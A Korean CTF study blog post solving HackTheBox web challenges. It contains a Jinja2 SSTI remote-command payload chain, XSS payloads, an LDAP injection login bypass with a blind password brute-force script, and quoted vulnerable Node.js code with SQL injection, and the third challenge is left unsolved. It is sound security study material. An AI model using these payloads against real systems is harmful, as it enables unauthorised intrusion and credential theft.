---
layout: post
title:  "HackTheBox Web Study"
author: 5un9hun
categories: [ HackTheBox ]
tags: [ HTB, Web ]
image: assets/images/htb/web/title.png
description: "hackthebox web study"
hidden: false
---

HackTheBox Web 문제를 살짝 맛봤는데 문제 난이도가 눈물이 났다. 이정도의 문제를 혼자 풀 실력을 가지면 실력 향상에 도움이 많이 될 것 같아서 HackTheBox Web을 정복해보고자 한다.


* [1. Templated - easy (20pts)](#1-templated-easy-20pts)
* [2. Phonebook - easy (30pts)](#2-phonebook-easy-30pts)
* [3. Weather App - easy (30pts)](#3-weather-app-easy-30pts)


# Web

## 1. Templated - easy (20pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/web/Untitled.png)

### 풀이 과정

주어진 사이트에 접속하면 다음과 같다.

![Untitled](/assets/images/htb/web/Untitled%201.png)

소스코드나 응답 헤더 등을 봐도 아무것도 보이지 않는다. 단서는 사이트에 있는 영어밖에 없었다. 

일단 사이트는 Flask/Jinja2 로 구동되고 있다.

다음처럼 robots.txt 를 먼저 체크해봤는데 다음처럼 404 error가 발생했다.

![Untitled](/assets/images/htb/web/Untitled%202.png)

그리고 접속한 페이지의 이름을 출력시켜주는데 Flask/Jinja2에서 SSTI 취약점이 발생하는 것을 알고 있기 때문에 {{7*7}}를 페이지의 이름으로 작성하여 리퀘스트를 보내면 다음과 같은 응답을 받을 수 있다.

<details>
<summary>source code</summary>
<div markdown="1">

```python
159.65.58.189:30607/{{7*7}}
```
</div></details>

![Untitled](/assets/images/htb/web/Untitled%203.png)

SSTI 취약점이 발생하는 것을 확인했고, 따라서 RCE를 발생시킬 페이로드를 주입시켜주면 된다.

popen 함수 오브젝트는 __subclasses__ 에서 414번째 인덱스에 존재했고 이를 통해 리눅스 명령어를 호출하면 된다.

<details>
<summary>source code</summary>
<div markdown="1">

```python
{{''.__class__.__mro__[1].__subclasses__()[414]}}

{{''.__class__.__mro__[1].__subclasses__()[414]('ls -al', shell=True, stdout=-1).communicate()}}

{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt', shell=True, stdout=-1).communicate()}}
```
</div></details>

위의 명령을 인젝션해서 RCE가 가능하므로, 플래그를 획득할 수 있다.

### 플래그 획득

![Untitled](/assets/images/htb/web/Untitled%204.png)

## 2. Phonebook - easy (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/web/Untitled%205.png)

### 풀이 과정

주어진 사이트에 접속하면 다음과 같은 화면을 확인할 수 있다. ⇒ /login

![Untitled](/assets/images/htb/web/Untitled%206.png)

일단 로그인창이 보이면 SQL Injection 문제인지 의심된다.

여러 기본적인 페이로드를 주입했으나 Authentication failed 출력하면서 진행이 되질 않는다. 또한 그 메세지가 출력될 때, message의 인자로 출력될 메세지가 들어있다.

<details>
<summary>source code</summary>
<div markdown="1">

```html
http://159.65.58.189:31377/login?message=Authentication%20failed
```
</div></details>

html 소스 코드를 살펴보면서 단서를 찾아갔는데 script 태그 아래에 다음과 같은 코드가 존재했다. 위의 링크처럼 url 파라미터의 message 의 값을 message id가 있는 태그에 출력시키는 코드이다.

<details>
<summary>source code</summary>
<div markdown="1">

```html
<script>
const queryString = window.location.search;
if (queryString) {
  const urlParams = new URLSearchParams(queryString);
  const message = urlParams.get('message');
  if (message) {
    document.getElementById("message").innerHTML = message;
    document.getElementById("message").style.visibility = "visible";
    }
  }
</script>
```
</div></details>

여기서 파라미터로 악의적인 페이로드를 삽입해서 XSS가 가능하다는 것을 확인했다.

<details>
<summary>source code</summary>
<div markdown="1">

```html
<script>alert(1)</script> 
```
</div></details>

DOM 내에 인젝션하기 때문에 위의 페이로드는 작동하지 않는다. 이는 아래와 같은 페이로드로 우회할 수 있다.

<details>
<summary>source code</summary>
<div markdown="1">

```css
<svg/onload='alert(1)'>
```
</div></details>

그런데 XSS를 어떻게 활용할 수가 없었다…

 

. . .  

이 문제는 해결할 기미가 보이지 않아서 write-up을 참조했다.

일단 로그인 창을 우회해야 문제를 진행할 수 있다.

아까 SQL Injection이 안먹힌다고 했는데 그 이유는 이 쿼리가 SQL 쿼리가 아니라 LDAP 쿼리이기 때문이다. 따라서 LDAP Injection을 이용하여 bypass 해야한다.

**LDAP(Lightweight Directory Access Protocol)**란?

TCP/IP 위에서 디렉터리 서비스를 조회하고 수정하는 응용 프로토콜이다. 인증을 위한 다른 서비스에 의해 자주 사용된다.

클라이언트가 다양한 정도로 지원하는 LDAP URI 스킴이 있으며 서버는 참조에 의거하여 반환한다.

<details>
<summary>source code</summary>
<div markdown="1">

```
ldap://host:port/DN?attributes?scope?filter?extensions
```
</div></details>

이 때 LDAP 서버에 쿼리를 통해 질의할 수 있는데 기본적인 쿼리 문법은 다음과 같다.

& , | 를 () 를 이용해서 묶어서 적용시킨다.

(&) 같은 경우 True 를 의미하며, (|) 같은 경우 False를 의미한다.

1. (&(조건1)(조건2)) : 조건1과 조건2를 모두 만족하는 경우
2. (|(조건1)(조건2)) : 조건1 또는  조건2를 만족하는 경우

이러한 기본적인 문법을 살짝 알아가면서 다시 문제를 해결해볼 수 있다.

먼저 처음의 로그인 쿼리를 생각해보면 다음과 같다.

<details>
<summary>source code</summary>
<div markdown="1">

```html
(&(username=USERNAME)(password=PASSWORD))
```
</div></details>

username과 password과 모두 만족해야 로그인할 수 있다. 이 때 대문자로 이루어진 곳이 사용자의 input이며, 이 값을 *으로 채우면 다음과 같이 모두 True로 된다.

<details>
<summary>source code</summary>
<div markdown="1">

```html
(&(username=*)(password=*)) 
=> True & True
```
</div></details>

따라서 다음과 같이 로그인에 성공한다.

![Untitled](/assets/images/htb/web/Untitled%207.png)

이제 검색 쿼리를 통해 admin의 계정의 패스워드를 탈취해야한다. 이는 블라인드 인젝션으로 해결할 수 있다.

아까 로그인 창에서 봤던 Reese라는 것을 검색해보면 다음과 같이 1개의 결과가 나온다.

![Untitled](/assets/images/htb/web/Untitled%208.png)

일단 이 계정의 password를 탈취하기 위해서는 로그인 창에서 blind ldap injection을 수행해야한다.

username은 Reese, 그리고 password는 와일드카드인 * 를 이용하며, 로그인이 됐는지 안됐는지 참 거짓 값으로 판별하여 password를 추출할 수 있다.

username 은 Reese로, password는 bf할 문자 + * 를 통해

<details>
<summary>source code</summary>
<div markdown="1">

```
(&(username=Reese)(password=A*))

(&(username=Reese)(password=B*))

(&(username=Reese)(password=C*))
```
…
</div></details>

를 통해 brute force를 진행하게 되고, 만약에 맞는 문자를 찾았다면 로그인에 성공하게 되어서 그 문자를 맞는 password의 조각으로 찾을 수 있다. 찾은 조각은 다시 password에 이어서 붙혀서 다음 password 조각을 찾을 수 있다.

<details>
<summary>source code</summary>
<div markdown="1">

```
(&(username=Reese)(password=HA*))

(&(username=Reese)(password=HB*))

(&(username=Reese)(password=HC*))

…
```
</div></details>

이는 파이썬 스크립트를 사용하여 편하게 구할 수 있다.

<details>
<summary>source code</summary>
<div markdown="1">

```python
import requests as rq
from string import printable

url = 'http://157.245.33.77:31977/login'

password = ''
while(1):
	for i in printable:
		if(i == "*"): continue #exclude wildcard 
		data = {
			"username":"Reese",
			"password":password + i + "*"
		}
		req = rq.post(url, data=data)
		print(i)
		if("No search results." in req.text):
			password += i
			print("FLAG : "+password)
			break
	if(password[-1] == "}"):
		break

print("FLAG : "+password)
```
</div></details>

### 플래그 획득

![Untitled](/assets/images/htb/web/Untitled%209.png)

처음 본 개념이라 많이 어려웠다.

## 3. Weather App - easy (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/web/Untitled%2010.png)

### 풀이 과정

이번 문제는 파일을 서버 파일을 제공해준다.

간단하게 핵심 코드를 살펴보면 다음과 같다.

- index.js

<details>
<summary>source code</summary>
<div markdown="1">

```jsx
const path              = require('path');
const fs                = require('fs');
const express           = require('express');
const router            = express.Router();
const WeatherHelper     = require('../helpers/WeatherHelper');

let db;

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
});

router.get('/register', (req, res) => {
	return res.sendFile(path.resolve('views/register.html'));
});

router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});

router.get('/login', (req, res) => {
	return res.sendFile(path.resolve('views/login.html'));
});

router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});

router.post('/api/weather', (req, res) => {
	let { endpoint, city, country } = req.body;

	if (endpoint && city && country) {
		return WeatherHelper.getWeather(res, endpoint, city, country);
	}

	return res.send(response('Missing parameters'));
});	

module.exports = database => { 
	db = database;
	return router;
};
```
</div></details>

- database.js

<details>
<summary>source code</summary>
<div markdown="1">

```jsx
const sqlite = require('sqlite-async');
const crypto = require('crypto');

class Database {
    constructor(db_file) {
        this.db_file = db_file;
        this.db = undefined;
    }
    
    async connect() {
        this.db = await sqlite.open(this.db_file);
    }

    async migrate() {
        return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
        `);
    }

    async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }

    async isAdmin(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?');
                let row = await smt.get(user, pass);
                resolve(row !== undefined ? row.username == 'admin' : false);
            } catch(e) {
                reject(e);
            }
        });
    }
}

module.exports = Database;
```
</div></details>

홈페이지 기능은 register, login 기능이 존재하며 SQL을 통해 서버에서 관리되고 있다. 따라서 그리고 index.js 파일을 보면 admin으로 로그인했을 때, flag를 출력시켜준다. 

database.js에서 데이터베이스를 생성하고, ‘admin’ 이라는 username과 32바이트의 헥스값으로 password를 저장해놓았다.

이 문제의 목표는 admin 계정으로 로그인하는 것이 목표이다.

어디서 Injection 취약점이 발생하는지 알아보면 다음과 같다.

<details>
<summary>source code</summary>
<div markdown="1">

```jsx
let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
```
</div></details>

두 개의 admin 계정을 생성할 수 없도록 username에는 UNIQUE가 걸려있다.

isAdmin 함수에서 다음과 같이 SQL Injection을 막아놓았다. (싱글쿼터가 안먹힌다.)

<details>
<summary>source code</summary>
<div markdown="1">


```sql
let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?');
let row = await smt.get(user, pass);
```
</div></details>

register 페이지에서 계정을 생성하려면 다음과 같은 코드 때문에 생성이 제한된다. 로컬에서만 생성이 되어야한다.

<details>
<summary>source code</summary>
<div markdown="1">

```jsx
if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
}
```
</div></details>

SSRF 생각이 나긴 했는데… 흠..

### 플래그 획득

… 아직 못 풀음.. 문제가 매우 맵다…